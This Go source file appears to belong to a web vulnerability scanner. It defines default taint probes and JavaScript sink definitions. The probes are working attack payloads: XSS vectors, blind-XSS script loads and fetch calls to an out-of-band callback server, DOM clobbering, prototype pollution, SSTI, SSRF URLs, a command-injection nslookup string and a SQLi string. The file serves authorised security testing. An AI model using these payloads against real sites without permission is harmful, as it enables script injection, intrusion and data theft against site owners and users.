// pkg/analysis/active/taint/probes.go
package taint

// DefaultProbes returns a comprehensive list of attack payloads for various vulnerability classes.
// MODULARITY: This function now provides defaults, the Analyzer consumes the configuration object.
func DefaultProbes() []ProbeDefinition {
	// Define the execution proof function call.
	executionProofCall := `window.` + JSCallbackExecutionProof + `('{{.Canary}}')`

	// OAST Integration: Define the OAST callback formats.
	// {{.OASTServer}} is replaced by the Analyzer if an OAST provider is configured.
	oastFetch := `fetch('http://{{.OASTServer}}/{{.Canary}}')`
	oastImage := `new Image().src='//{{.OASTServer}}/i/{{.Canary}}'`

	return []ProbeDefinition{
		// -- XSS Probes: Execution-Based (High Confidence) --

		// HTML Injection Context
		{
			Type:        ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<img src=x onerror=` + executionProofCall + `>`,
			Description: "Classic XSS via image onerror event.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<svg/onload=` + executionProofCall + `>`,
			Description: "XSS via SVG onload event.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<video><source onerror=` + executionProofCall + `></video>`,
			Description: "XSS via video source onerror event (HTML5).",
		},

		// Attribute Injection Context
		{
			Type:        ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a double-quoted attribute and using event handlers.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `' autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a single-quoted attribute.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" style="animation-name:x" onanimationstart=` + executionProofCall,
			Description: "XSS via CSS animation event handler.",
		},

		// URI Context (e.g., <a href="...">)
		{
			Type:        ProbeTypeXSS,
			Context:     "URI_INJECTION",
			Payload:     `javascript:` + executionProofCall,
			Description: "XSS via javascript: protocol handler in URI attribute.",
		},

		// JavaScript Injection Context (inside <script> tags)
		{
			Type:        ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `';` + executionProofCall + `;//`,
			Description: "XSS by terminating a JS statement (single quote) and executing arbitrary code.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `</script><script>` + executionProofCall + `</script>`,
			Description: "XSS by closing the current script tag and opening a new one.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "JS_INJECTION",
			// Template literal injection (ES6)
			Payload:     "${" + executionProofCall + "}",
			Description: "XSS within JS template literals (backticks).",
		},

		// -- XSS Probes: OAST-Based (Blind XSS) --
		{
			Type:        ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<script src="//{{.OASTServer}}/s/{{.Canary}}"></script>`,
			Description: "Blind XSS via external script loading.",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "BLIND_JS_INJECTION",
			Payload:     `';` + oastFetch + `;//`,
			Description: "Blind XSS via JS fetch callback (JS context).",
		},
		{
			Type:        ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<img src=x onerror="` + oastImage + `">`,
			Description: "Blind XSS via image onerror (HTML context).",
		},

		// -- DOM Clobbering/Interference --
		{
			Type:        ProbeTypeDOMClobbering,
			Context:     "HTML_INJECTION",
			// Attempts to clobber 'window.someVar.enabled' and trigger execution if logic relies on it.
			Payload:     `<a id=someVar><a id=someVar name=enabled href="javascript:` + executionProofCall + `">ClickMe</a>`,
			Description: "DOM Clobbering (A/A) leading to potential logic bypass or XSS.",
		},
		{
			Type:        ProbeTypeDOMClobbering,
			Context:     "HTML_INJECTION",
			// Attempts to clobber 'window.settings.isAdmin' to true. (Does not execute JS, aims to disrupt logic).
			Payload:     `<form id=settings><input name=isAdmin value=true></form>`,
			Description: "DOM Clobbering (Form/Input) targeting configuration objects.",
		},

		// -- JavaScript Prototype Pollution --
		{
			Type:        ProbeTypePrototypePollution,
			Context:     "JSON_PARSE_MERGE",
			// Pollutes Object.prototype with 'scalpelPolluted' set to the canary.
			// The JS shim detects this pollution.
			Payload:     `{"__proto__":{"scalpelPolluted":"{{.Canary}}"}}`,
			Description: "Prototype Pollution via __proto__ injection (Common).",
		},
		{
			Type:        ProbeTypePrototypePollution,
			Context:     "QS_PARSE_MERGE",
			// Pollution via query string format (common in URL params/hash).
			Payload:     `__proto__[scalpelPolluted]={{.Canary}}`,
			Description: "Prototype Pollution via __proto__ injection (Query String format).",
		},
		{
			Type:        ProbeTypePrototypePollution,
			Context:     "MERGE_CLONE",
			// Pollution via constructor.prototype (sometimes bypasses filters).
			Payload:     `{"constructor":{"prototype":{"scalpelPolluted":"{{.Canary}}"}}}` ,
			Description: "Prototype Pollution via constructor.prototype injection.",
		},

		// -- SSTI (Server-Side Template Injection) --
		// These rely on the server evaluating the template and reflecting the XSS payload.
		{
			Type:        ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `${7*7}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (JSP/EL/Velocity/Spring).",
		},
		{
			Type:        ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `{{7*7}}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (Twig/Jinja2/Handlebars/AngularJS).",
		},

		// -- OAST (SSRF, Blind RCE, etc.) --
		// These probes test if user input influences server-side requests or commands.
		{
			Type:        ProbeTypeOAST,
			Context:     "SSRF_HTTP",
			Payload:     `http://{{.OASTServer}}/ssrf/{{.Canary}}`,
			Description: "SSRF via HTTP URL injection.",
		},
		{
			Type:        ProbeTypeOAST,
			Context:     "BLIND_RCE_DNS",
			// Attempts to execute nslookup/ping to trigger a DNS interaction.
			Payload:     `; nslookup {{.Canary}}.{{.OASTServer}} #`,
			Description: "Blind RCE (Linux) via command injection triggering DNS interaction.",
		},

		// -- SQLi & Command Injection (Reflected as XSS) --
		// These test if backend injections result in reflected XSS.
		{
			Type:        ProbeTypeSQLi,
			Context:     "REFLECTED_XSS",
			Payload:     `' OR '1'='1 <script>` + executionProofCall + `</script>`,
			Description: "Reflected SQLi leading to XSS.",
		},
		{
			Type:        ProbeTypeCmdInjection,
			Context:     "REFLECTED_XSS",
			Payload:     `; echo '<script>` + executionProofCall + `</script>' #`,
			Description: "Reflected Command Injection leading to XSS.",
		},

		// -- Generic Data Flow Tracking --
		{
			Type:        ProbeTypeGeneric,
			Context:     "UNKNOWN",
			Payload:     `GENERIC_{{.Canary}}`,
			Description: "Generic canary tracking for data flow analysis (leakage/exfiltration).",
		},
	}
}

// DefaultSinks defines the JavaScript functions and properties to be instrumented.
func DefaultSinks() []SinkDefinition {
	return []SinkDefinition{
		// -- Execution Sinks (High Risk) --
		{Name: "eval", Type: SinkEval, Setter: false, ArgIndex: 0}, // Global eval
		// setTimeout/setInterval are only dangerous if the first argument is a string.
		{Name: "setTimeout", Type: SinkEval, Setter: false, ArgIndex: 0, ConditionID: "IS_STRING_ARG0"},
		{Name: "setInterval", Type: SinkEval, Setter: false, ArgIndex: 0, ConditionID: "IS_STRING_ARG0"},
		// Function constructor sinks
		{Name: "Function", Type: SinkFunctionConstructor, Setter: false, ArgIndex: 0},
		{Name: "Function.prototype.constructor", Type: SinkFunctionConstructor, Setter: false, ArgIndex: 0},

		// -- DOM Manipulation & HTML Rendering Sinks --
		{Name: "document.write", Type: SinkDocumentWrite, Setter: false, ArgIndex: 0},
		{Name: "document.writeln", Type: SinkDocumentWrite, Setter: false, ArgIndex: 0},

		// These apply to standard DOM and Shadow DOM elements due to prototype inheritance.
		{Name: "Element.prototype.innerHTML", Type: SinkInnerHTML, Setter: true},
		{Name: "Element.prototype.outerHTML", Type: SinkOuterHTML, Setter: true},
		{Name: "Element.prototype.insertAdjacentHTML", Type: SinkInnerHTML, Setter: false, ArgIndex: 1},

		// DOMParser sink
		{Name: "DOMParser.prototype.parseFromString", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},

		// jQuery sinks (Common sources of DOM XSS)
		{Name: "jQuery.prototype.html", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.append", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.prepend", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.after", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.before", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.prototype.replaceWith", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},
		{Name: "jQuery.globalEval", Type: SinkEval, Setter: false, ArgIndex: 0},
		{Name: "jQuery.parseHTML", Type: SinkInnerHTML, Setter: false, ArgIndex: 0},

		// -- Navigation Sinks (Open Redirect / Protocol-based XSS) --
		{Name: "location.href", Type: SinkNavigation, Setter: true},
		{Name: "location", Type: SinkNavigation, Setter: true},
		{Name: "location.assign", Type: SinkNavigation, Setter: false, ArgIndex: 0},
		{Name: "location.replace", Type: SinkNavigation, Setter: false, ArgIndex: 0},
		{Name: "open", Type: SinkNavigation, Setter: false, ArgIndex: 0}, // Global open

		// -- Resource Loading Sinks --
		{Name: "HTMLScriptElement.prototype.src", Type: SinkScriptSrc, Setter: true},
		{Name: "HTMLIFrameElement.prototype.src", Type: SinkIframeSrc, Setter: true},
		{Name: "HTMLIFrameElement.prototype.srcdoc", Type: SinkIframeSrcDoc, Setter: true},

		// -- Data Exfiltration / Network Sinks --
		{Name: "WebSocket.prototype.send", Type: SinkWebSocketSend, Setter: false, ArgIndex: 0},

		// navigator.sendBeacon (Arg 1 is the data)
		{Name: "navigator.sendBeacon", Type: SinkSendBeacon, Setter: false, ArgIndex: 1, ConditionID: "SEND_BEACON_DATA_EXISTS"},

		// XHR: Body (send) or URL (open)
		{Name: "XMLHttpRequest.prototype.send", Type: SinkXMLHTTPRequest, Setter: false, ArgIndex: 0, ConditionID: "XHR_SEND_DATA_EXISTS"},
		{Name: "XMLHttpRequest.prototype.open", Type: SinkXMLHTTPRequest_URL, Setter: false, ArgIndex: 1},

		// Fetch: URL (arg 0) or Body (arg 1) - Handled dynamically in JS Shim
		{Name: "fetch", Type: SinkFetch_URL, Setter: false, ArgIndex: 0},
		{Name: "fetch", Type: SinkFetch, Setter: false, ArgIndex: 1},

		// -- Inter-Process Communication (IPC) Sinks --

		// window.postMessage (Taint flowing to other windows/iframes)
		{Name: "Window.prototype.postMessage", Type: SinkPostMessage, Setter: false, ArgIndex: 0},
		// Worker.postMessage (Taint flowing to Web Workers)
		{Name: "Worker.prototype.postMessage", Type: SinkWorkerPostMessage, Setter: false, ArgIndex: 0},
		// DedicatedWorkerGlobalScope.postMessage (Taint flowing from Worker back to main thread)
		{Name: "DedicatedWorkerGlobalScope.prototype.postMessage", Type: SinkPostMessage, Setter: false, ArgIndex: 0},
	}
}
